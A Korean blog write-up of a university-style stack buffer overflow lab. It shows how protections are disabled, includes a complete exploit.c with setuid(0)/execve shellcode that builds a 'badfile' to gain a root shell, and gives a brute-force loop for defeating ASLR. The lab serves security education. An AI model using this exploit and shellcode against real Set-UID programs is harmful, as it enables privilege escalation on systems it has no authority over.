---
layout: single
title: "Stack Buffer-Overflow(BOF)"
category: [System Security]
toc: true
author_profile: true # 왼쪽에 프로필이 해당 게시물에서 나타낼지 말지 정하는 것

# sidebar는 좌측에 navi 생성하는 것
sidebar:
    nav: "docs"
# search 기능 제한하는 법
# search: false
---
# Stack Buffer Overflow(BOF)

## Environment Set up

---

### ASLR

- Address Space Layout Randomization ( OS level )
    
    ```powershell
    sudo sysctl -w kernel.randomize_va_space = 0
    ```
    

### StackGuard

- StackGuard Protection Scheme ( Compiler level )
    
    ```powershell
    gcc -fno-stack-protector example.c
    ```
    

### Non-Executable Stack

- Non-Executable Stack ( Hardware level )
    
    ```powershell
    ## For executable stack:
    gcc -z execstack -o test test.c
    
    ## For non-executable stack:
    gcc -z noexecstack -o test test.c
    ```
    

### Configuring /bin/sh ( Ubuntu 16.04 VM only )

- /bin/sh은 기본적으로 /bin/dash와 링크 되어 있는데 dash는 Set-UID 프로그램 실행이 제한적이다.
- 그러므로, zsh과 링크 해준다.
- 명령어
    
    ```powershell
    sudo ln -sf /bin/zsh /bin/sh
    ```
    

## Task 1: Running Shellcode

---

### Task purpose

- 우선 우리는 shellcode와 친숙해져야 한다. shellcode는 shell을 실행하는 code를 말한다. 이는 우리가 취약적인 프로그램을 해당 shellcode로 점프할 수 있도록 메모리 상에 적재되어야 한다. 해당 작업에 필요한 shellcode를 직접 작성 해볼 것이다.

### Progress

- Step 1: call_shellcode.c 프로그램을 작성한다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled.png)
    
- Step 2: gcc를 이용하여 위 코드(call_shellcode.c)를 컴파일 한다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%201.png)
    
- Step 3: Vulnerable Program(stack.c)을 작성한다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%202.png)
    
- Step 4: 해당 stack.c 프로그램을 옵션을 달아 컴파일 해준다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%203.png)
    

### Result

Step 1, 2 결과

![Untitled](../images/Stack%20Buff%208fe39/Untitled%201.png)

→ shell code를 실행하니 shell 이 실행된 모습이다.

Step 3, 4 결과

![Untitled](../images/Stack%20Buff%208fe39/Untitled%203.png)

→ 해당 code를 작성하고 컴파일 하여 Set-UID 프로그램을 만들어준 모습이다. 해당 프로그램은 BOF 취약점을 가지고 있다.

### Consideration

→ Step 2:에서 bin 디렉터리와 한 공간에서 작업이 이루어지지 않으면 Segmentation fault error을 경험할 수 있다. 될 수 있으면 bin 디렉터리와 한 공간에서 진행하자.

→ Step 4:에서 해당 옵션을 잘 붙여줘야 올바르게 작동한다. 주의하자.

## Task 2: Exploiting Vulnerability

---

### Task purpose

→ Task 1에서 사용한 badfile을 제작하기 위해, exploit.c라는 프로그램을 작성할 것이다. 

### Progress

- Step 1: ‘stack.c’를 gdb를 이용하여 buff와 ebp 사이의 거리를 구하고 계산하여, return address의 주소를 구한다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%204.png)
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%205.png)
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%206.png)
    
    >> 즉 ebp와 buffer의 거리가 85이고 return address를 가리키는 스택의 위치는 85+4인 89임을 알 수 있다. return address의 정확한 위치는 기존의 buff 위치 + 517 - shellcode의 길이만큼 해주면 정확한 return address의 위치를 알 수 있다. 그리하여 exploit.c를 작성해준다.
    
- Step 2: 다음을 바탕으로 exploit.c를 작성한다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%207.png)
    
- Step 3: exploit.c 프로그램을 컴파일 하고 실행한다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%208.png)
    
- Step 4: 이후 stack.c를 실행 해준다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%209.png)
    

### Result

→ Step 2의 결과

![Untitled](../images/Stack%20Buff%208fe39/Untitled%2010.png)

→ Step 4의 결과

![Untitled](../images/Stack%20Buff%208fe39/Untitled%209.png)

### Consideration

- vulnerable program(stack.c)를 반드시 먼저 컴파일 하여야 한다.
- exploit.c 프로그램은 반드시 stackguard protection이 켜져있는 상태에서 컴파일 되어야한다.
    - 우리는 해당 프로그램에서 BOF를 일으킬 생각이 없기 때문!
    - stack.c에서 BOF가 일어나기 때문에 해당 프로그램을 컴파일 할 때는 disabled 상태여야 함.
- 교재에서는 return address와 shellcode 사이에 0x90 (NOP)을 넣어줘서 그 사이 아무 곳에라도 return 되면 알아서 shellcode가 진행된다 했지만, 정확한 값을 입력해주지 않으면 Illegal Instruction이라는 에러가 등장했다. 정확한 shellcode 위치를 찾아 return address에 지정해주자.

## Task 3: Defeating dash’s Countermeasure

---

### Task purpose

- 앞서 말했듯이, dash 쉘의 경우 Set-UID 프로그램의 사용이 금지되어 있어, 해당 프로그램을 사용시 자동으로 권한을 낮추는 기능이 있다. 이를 뚫는 방법에 대해 이번 Task에서 알아보자. 그중 하나는 zsh를 사용하는 것이었고, 다른 접근법으로는 victim process의 real User Id를 0으로 만들어주는 것이다.

### Progress

- Step 1: 우선 shell을 dash shell로 바꿔놓는다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2011.png)
    
- Step 2: dash_shell_test.c라는 프로그램을 작성한다.
    
    ```c
    // dash_shell_test.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    int main()
    {
    	char *argv[2];
    	argv[0] = "/bin/sh";
    	argv[1] = NULL;
    
    	// setuid(0);
    	execve("/bin/sh", argv, NULL);
    
    	return 0;
    }
    ```
    
- Step 3: 해당 프로그램을 컴파일 해주고, Set_UID 프로그램으로 만들어준다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2012.png)
    
    → 정상적으로 shell이 실행되는 것을 볼 수 있다.
    
- Step 4: Task 2에서 실행했던 exploit.c에 교재에서 말한 4줄을 수정하고 다시 진행해본다.
    
    ```c
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    
    char shellcode[]=
    	"\x31\xc0"
    	"\x31\xdb"
    	"\xb0\xd5"
    	"\xcd\x80"
    // ------------the code below is the same as the one in Task 2----------
    	"\x31\xc0"
    	"\x50"
    	"\x68""//sh"
    	"\x68""/bin"
    	"\x89\xe3"
    	"\x50"
    	"\x53"
    	"\x89\xe1"
    	"\x99"
    	"\xb0\x0b"
    	"\xcd\x80"
    ;
    
    void main(int argc, char **argv)
    {
    	char buffer[517];
    	FILE *badfile;
    	int shelllen;
    	int off;
    	int buff;
    	int ebp;
    	int ret;
    	int start;
    	
    	// Initialize buffer with 0x90 (NOP instruction)
    	memset(&buffer, 0x90, 517);
    
    	// fill this section
    	//	shell code inserted
    	shelllen = strlen(shellcode);
    	memcpy(buffer+517-shelllen, shellcode, shelllen);
    
    	buff = 0xbfffe993;
    	ebp = 0xbfffe9e8;
    	off = ebp - buff + 4;
    	ret = buff + 517 - shelllen;
    
    	// somewhere between return address space and shellcode filled with 0x90
    	memcpy(buffer+off, &ret, 4);
    
    	badfile = fopen("./badfile", "w");
    	fwrite(buffer, 517, 1, badfile);
    	fclose(badfile);
    }
    ```
    

### Result

- Step 4에 대한 결과
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2013.png)
    
    → 다음과 같이 dash shell에서도 정상적으로 작동함을 볼 수 있다.
    

### Consideration

- victim process의 real user id를 0으로 바꾸는 코드를 추가함으로써, dash shell에서도 Set-UID 프로그램을 통한 root 권한 탈취가 가능해짐을 알 수 있었다.

## Task 4: Defeating Address Randomization

---

### Task purpose

- 32bit 체제의Linux system에서는 stack은 단지 19bits의 entropy를 가진다. 이는 $2^{19}$ = 524,288로 충분히 brute-force로 계산 가능한 범위이다. 그러므로 ASLR 대응책도 한 번 뚫어보자.

### Progress

- Step 1: 우선 원래대로의 ASLR을 적용한다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2014.png)
    
- Step 2: 우리는 vulnerable program(stack.c)를 반복적으로 실행하여, 결국에는 우리가 원하는 badfile이 맞도록 할 것이다. 그러기 위해서, 다음과 같은 shell script를 실행시키자. 해당 프로그램은 정상적으로 ./stack이 실행 됐을 때 종료 된다.
    
    ```powershell
    #!/bin/bash
    
    SECONDS=0
    value=0
    
    while [ 1 ]
        do
        value=$(( $value+1 ))
        duration=$SECONDS
        min=$(($duration / 60))
        sec=$(($duration % 60))
        echo "$min minutes and $sec seconds elapsed."
        echo "The program has been running $value times so far."
        ./stack
    done
    ```
    

### Result

- Step 2에 대한 결과
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2015.png)
    
    → 정상적으로 루트 권한을 얻은 모습을 볼 수 있다.
    

### Consideration

- 결과적으로, 32bit 운영체제에서는 stack의 배정 범위가 그렇게 많지 않으므로, badfile이 맞을 때까지 계속해서 loop를 돌리면 언젠가는 맞는 것이 가능하다.

## Task 5: Turn on the StackGuard Protection

---

### Task purpose

- 우리는 이번 Task에서 StackGuard Protection이 켜져있는 상황에서의 Task 2를 진행할 것이다.

### Progress

- Step 1: 이전 Task에서 켰던 ASLR option을 다시 0으로 설정해준다.
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2016.png)
    
- Step 2: Stackguard를 끄지 않고 stack.c를 컴파일 해준다.
- Step 3: exploit.c는 stack.c를 컴파일 해준 뒤 컴파일 해줘야 하므로 exploit.c도 다시 컴파일 해준다.
- Step 4: 이후 stack.c를 실행해준다.

### Result

- 결과
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2017.png)
    
    → Stack guard protector를 끄지 않고 진행해주면 다음과 같은 error message를 확인할 수 있었다.
    

### Consideration

- Stack guard protector는 gcc 4.3.3 버젼부터는 디폴트 값으로 설정되어 있기 때문에 굳이 따로 설정하지 않으면 실행되는 상태였다.
- stack.c를 새로 컴파일 해주면 exploit.c도 컴파일 해줘야됨을 잊지 말자.

## Task 6: Turn on the Non-executable Stack Protection

---

### Task purpose

- 이번에는 Non-executable Stack Protection을 끄지 않은 체 Task 2를 진행해볼 것이다.

### Progress

- Step 1: 우선 기존의 stack.c 프로그램을 noexecstack 옵션으로 컴파일 해준다.
- Step 2: exploit.c를 컴파일 하기 이전에 stack.c를 컴파일 해줘야 하므로 다시 exploit.c를 컴파일 해준다.
- Step 3: 이후 ./stack 을 실행해준다.

### Result

- 결과
    
    ![Untitled](../images/Stack%20Buff%208fe39/Untitled%2018.png)
    
    → 다음과 같이 Segmentation fault error message가 뜨며 정상적으로 root shell을 얻을 수 없다.
    

### Consideration

- stack을 새롭게 compile하면 기존의 exploit도 다시 컴파일 해줘야 된다는 것을 잊지 말자.

<a href="#page-title" class="back-to-top">맨 위로 이동 &uarr;</a>